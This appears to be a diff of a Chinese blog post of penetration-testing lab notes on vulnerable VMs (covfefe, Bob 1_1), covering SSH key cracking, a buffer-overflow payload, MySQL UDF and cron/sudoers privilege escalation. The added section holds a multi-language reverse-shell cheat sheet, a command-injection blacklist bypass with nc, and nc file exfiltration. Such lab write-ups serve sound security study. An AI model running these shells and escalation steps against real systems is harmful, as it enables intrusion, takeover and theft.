@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2020-02-03</span>
-            <span class="time">06:19:58</span>
+            <span class="time">07:02:39</span>
           </span>
           
         </div>
@@ -110,7 +110,7 @@
         <div class="post-content">
           <p>保研希望渺茫,一天一渗透,提升自己</p>
 <a id="more"></a>
-<h1 id="covfefe渗透实战"><a href="#covfefe渗透实战" class="headerlink" title="covfefe渗透实战"></a>covfefe渗透实战</h1><p><code>nmap -sS -Pn -A -p- -n 192.168.8.139</code><br>首先扫描网段 nmap -sn xxxx/24<br>扫可疑端口目录<br>ssh 可以 用私钥登陆 与服务器上的公钥进行认证 认证成功就登陆<br><code>ssh -i 私钥文件 用户名@ip</code><br>扫目录有的为了寻找ssh的私钥文件 私钥有的带密码 需要进一步破解<br>找到文件后需要赋予权限 chmod 600(只有拥有者有读写权限。)<br> 查看<br> <code>ls -alh</code><br> 破解私钥文件密码<br><code>locate ssh2john</code><br><code>python 路径名.py 私钥文件&gt;isacrack</code><br><code>john isacrack</code><br>破解密码成功<br>进入ssh控制 cd /root 进入root目录<br>最重要的是提权,这里介绍溢出提权<br>首先要找到以目前的权限能够执行的文件<br><code>find / -perm -4000 2&gt;/dev/null</code><br>c文件 溢出关键函数 比较<br>int strncmp(str1,str2,n)<br>参数<br>    str1 – 要进行比较的第一个字符串。<br>    str2 – 要进行比较的第二个字符串。<br>    n – 要比较的最大字符数。<br>返回值<br>该函数返回值如下：<br>    如果返回值 &lt; 0，则表示 str1 小于 str2。<br>    如果返回值 &gt; 0，则表示 str2 小于 str1。<br>    如果返回值 = 0，则表示 str1 等于 str2。<br>例如这题中</p>
+<h1 id="covfefe渗透实战"><a href="#covfefe渗透实战" class="headerlink" title="covfefe渗透实战"></a>covfefe渗透实战</h1><p><code>nmap -sS -Pn -A -p- -n 192.168.8.139</code><br>首先扫描网段 nmap -sn xxxx/24<br>扫可疑端口目录<br>ssh 可以 用私钥登陆 与服务器上的公钥进行认证 认证成功就登陆<br><code>ssh -i 私钥文件 用户名@ip</code><br>扫目录有的为了寻找ssh的私钥文件 私钥有的带密码 需要进一步破解<br>找到文件后需要赋予权限 chmod 600(只有拥有者有读写权限。)<br>查看<br><code>ls -alh</code><br>破解私钥文件密码<br><code>locate ssh2john</code><br><code>python 路径名.py 私钥文件&gt;isacrack</code><br><code>john isacrack</code><br>破解密码成功<br>进入ssh控制 cd /root 进入root目录<br>最重要的是提权,这里介绍溢出提权<br>首先要找到以目前的权限能够执行的文件<br><code>find / -perm -4000 2&gt;/dev/null</code><br>c文件 溢出关键函数 比较<br>int strncmp(str1,str2,n)<br>参数<br>    str1 – 要进行比较的第一个字符串。<br>    str2 – 要进行比较的第二个字符串。<br>    n – 要比较的最大字符数。<br>返回值<br>该函数返回值如下：<br>    如果返回值 &lt; 0，则表示 str1 小于 str2。<br>    如果返回值 &gt; 0，则表示 str2 小于 str1。<br>    如果返回值 = 0，则表示 str1 等于 str2。<br>例如这题中</p>
 <pre><code class="hljs undefined"><span class="hljs-keyword">char</span> a[]=<span class="hljs-string">"simon"</span>;
 <span class="hljs-keyword">char</span> buf[<span class="hljs-number">20</span>];
 <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strncmp</span>(a,buf,<span class="hljs-number">5</span>))
@@ -119,7 +119,7 @@
 &#125;</code></pre>
 
 <p>溢出前二十个字节就可以溢出<br>payloads<br><code>simon000000000000000/bin/sh</code><br>跳转到/bin/sh<br>whoami<br>pwd</p>
-<h1 id="mysql-udf-提权"><a href="#mysql-udf-提权" class="headerlink" title="mysql udf 提权"></a>mysql udf 提权</h1><p>前提一定是我们拿到了对方的shell,一般可以用ssh<br>如果发现他是wordpress后台可以利用wpscan扫描一下目录<br><code>wpscan --url http://ip/wordpress/ --wp-content-dir -ep -et -eu</code>(更新问题未解决)<br><strong>可以获得用户名,ssh尝试登陆,通常密码也是用户名,这时已经进入对方系统，如果用不了用别的方法拿到shell,再用如下wp-config的密码进入数据库</strong><br>利用LinEnum.sh 发现mysql由root权限就可以考虑这个漏洞<br>windows下<br>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/<br>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。<br>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。<br>拥有可以将udf.dll写入相应目录的权限。<br>我们可以在kali中<br><code>searchsploit mysql udf</code><br>此时我们已经在对方的shell中,这一点不要忘<br>切换当前目录到/var/www/html/wordpress目录下，并查找wp-config文件，这个文件会存储着MySQL数据库的密码。udf的使用需要我们登陆数据库<br>找到udf对应的文件后<br>先将原始的C语言代码编译成.so文件，然后再上传到靶机中运行来利用这个MySQL漏洞。<br>第一步是编译。</p>
+<h1 id="mysql-udf-提权"><a href="#mysql-udf-提权" class="headerlink" title="mysql udf 提权"></a>mysql udf 提权</h1><p>前提一定是我们拿到mysql了对方的shell,一般可以用ssh<br>如果发现他是wordpress后台可以利用wpscan扫描一下目录<br><code>wpscan --url http://ip/wordpress/ --wp-content-dir -ep -et -eu</code>(更新问题未解决)<br><strong>可以获得用户名,ssh尝试登陆,通常密码也是用户名,这时已经进入对方系统，如果用不了用别的方法拿到shell,再用如下wp-config的密码进入数据库</strong><br>利用LinEnum.sh 发现mysql由root权限就可以考虑这个漏洞<br>windows下<br>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/<br>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。<br>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。<br>拥有可以将udf.dll写入相应目录的权限。<br>我们可以在kali中<br><code>searchsploit mysql udf</code><br>此时我们已经在对方的shell中,这一点不要忘<br>切换当前目录到/var/www/html/wordpress目录下，并查找wp-config文件，这个文件会存储着MySQL数据库的密码。udf的使用需要我们登陆数据库<br>找到udf对应的文件后<br>先将原始的C语言代码编译成.so文件，然后再上传到靶机中运行来利用这个MySQL漏洞。<br>第一步是编译。</p>
 <pre><code class="hljs undefined">searchsploit –m <span class="hljs-number">1518</span><span class="hljs-selector-class">.c</span>
 gcc -g -shared -Wl,-soname,<span class="hljs-number">1518</span><span class="hljs-selector-class">.so</span> -o <span class="hljs-number">1518</span><span class="hljs-selector-class">.so</span> <span class="hljs-number">1518</span><span class="hljs-selector-class">.c</span> -lc</code></pre>
 
@@ -194,7 +194,7 @@ set payload linux/<span class="hljs-comment">x86</span>/meterpreter/<span class=
 <span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 10.211.55.4</span>
 exploit</code></pre>
 
-<p><strong>利用定时技巧提权</strong><br>先转到shell桌面<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>whoami 查看当前用户名,对之后写脚本有用<br>查看定时执行命令<br><code>cat /etc/crontab</code><br>发现有个root权限的脚本sh<br>修改CleaningScript.sh内容，使它能够修改sudoers，给予当前用户jenkins免密码执行sudo的权限。<br>并利用crontab定时执行该任务<br><code>echo &quot;echo &#39;jenkins ALL=(ALL) NOPASSWD:ALL&#39; &gt;&gt; /etc/sudoers&quot; &gt;&gt; /etc/script/CleaningScript.sh</code><br>执行shell<br><code>sudo /bin/bash</code><br>cd ~ cat flag.txt<br>第二种姿势,这个也行,首先我们给cp 权限<br>我们要利用/tmp 所有用户可以访问的特点</p>
+<p><strong>利用定时技巧提权</strong><br>先转到shell桌面<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>whoami 查看当前用户名,对之后写脚本有用<br>查看定时执行命令<br><code>cat /etc/crontab</code><br>发现有个root权限的脚本sh<br>修改CleaningScript.sh内容，使它能够修改sudoers，给予当前用户jenkins免密码执行sudo的权限。<br>并利用crontab定时执行该任务<br><code>echo &quot;echo &#39;jenkins ALL=(ALL) NOPASSWD:ALL&#39; &gt;&gt; /etc/sudoers&quot; &gt;&gt; /etc/script/CleaningScript.sh</code><br>执行shellt<br><code>sudo /bin/bash</code><br>cd ~ cat flag.txt<br>第二种姿势,这个也行,首先我们给cp 权限<br>我们要利用/tmp 所有用户可以访问的特点</p>
 <pre><code class="hljs undefined"><span class="hljs-keyword">cd</span> <span class="hljs-string">/etc/script/</span>             
 <span class="hljs-keyword">echo</span> <span class="hljs-string">"chmod u+s /usr/bin/cp"</span> &gt; CleaningScript.sh</code></pre>
 
@@ -251,6 +251,38 @@ msf exploit(multi/handler) &gt; run
 ./dirty</code></pre>
 
 <p>会出现账号密码 sudo root 就行</p>
+<h1 id="Bob-1-1"><a href="#Bob-1-1" class="headerlink" title="Bob 1_1"></a>Bob 1_1</h1><p>这里主要介绍一下用nc绕过黑名单 getshell,其他的没啥了<br>进去扫目录 进入/robots.txt,有一个用来执行命令的框,我们需要ls一下看有啥文件吧<br>然而很多命令都被禁了<br>这里可以用ls的升级版命令lsattr，发现当前目录下存在dev_shell.php.bak备份文件，直接down下来，审计源码<br>查看源码发现黑名单写死了”pwd”, “ls”, “netcat”, “ssh”, “wget”, “ping”, “traceroute”, “cat”, “nc”还有;<br>可以通过&amp;&amp; 绕过 和 ｜<br>介绍一种很牛逼的绕过,获得shell</p>
+<pre><code class="hljs undefined"><span class="hljs-comment">#bash版本：</span>
+bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">8080</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>
+
+<span class="hljs-comment">#perl版本:</span>
+perl -e 'use Socket;$i=<span class="hljs-string">"10.0.0.1"</span>;$p=<span class="hljs-number">1234</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">"tcp"</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">"/bin/sh -i"</span>);&#125;;'
+
+<span class="hljs-comment">#python版本：</span>
+python -c 'import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">"10.0.0.1"</span>,<span class="hljs-number">1234</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">"/bin/sh"</span>,<span class="hljs-string">"-i"</span>]);'
+
+<span class="hljs-comment">#php版本：</span>
+php -r '$sock=fsockopen(<span class="hljs-string">"10.0.0.1"</span>,<span class="hljs-number">1234</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);'
+
+<span class="hljs-comment">#ruby版本：</span>
+ruby -rsocket -e'f=TCPSocket.<span class="hljs-keyword">open</span>(<span class="hljs-string">"10.0.0.1"</span>,<span class="hljs-number">1234</span>).to_i;<span class="hljs-keyword">exec</span> sprintf(<span class="hljs-string">"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d"</span>,f,f,f)'
+
+<span class="hljs-comment">#nc版本：</span>
+nc -e /bin/sh <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">1234</span>
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">1234</span> &gt;/tmp/f
+
+nc x.x.x.x <span class="hljs-number">8888</span>|/bin/sh|nc x.x.x.x <span class="hljs-number">9999</span>
+
+<span class="hljs-comment">#java版本</span>
+r = Runtime.getRuntime()
+p = r.<span class="hljs-keyword">exec</span>([<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])
+p.waitFor()
+
+<span class="hljs-comment">#lua</span>
+lua -e <span class="hljs-string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></code></pre>
+
+<p>以上是几个大佬整理的反弹shell姿势<br>我们可以通过&amp;&amp;<br><code>whoami&amp;&amp;nc 192.168.8.253 4444 -e /bin/sh</code><br>|<br><code>whoami | nc 192.168.8.253 4444 -e /bin/sh</code><br>/bin<br><code>/bin/nc 192.168.8.253 4444 -e /bin/sh</code><br>kali端只要nc -nvlp 4444<br>下一步提权 我们发现有有个sh,把首首字母拼起来是个密码,是gpg解密用的,这里我就不过多介绍了<br>但是我们知道www-data权限很多工具用不了,只能在kali中,那么就要用到nc了<br>因为我们之前用过所以知道肯定能用<br><code>nc -w 3 192.168.8.253 4445&lt;login.txt.gpg</code><br>把ppg文件发到kali的4445端口<br>kali新建一个shell<br><code>nc -lvp 4445&gt; login.txt.gpg</code><br>kali接收到gpg后解密<br><code>gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</code><br>拿到账号密码<br>su bob<br>can you believe that?</p>
 
         </div>
       </div>
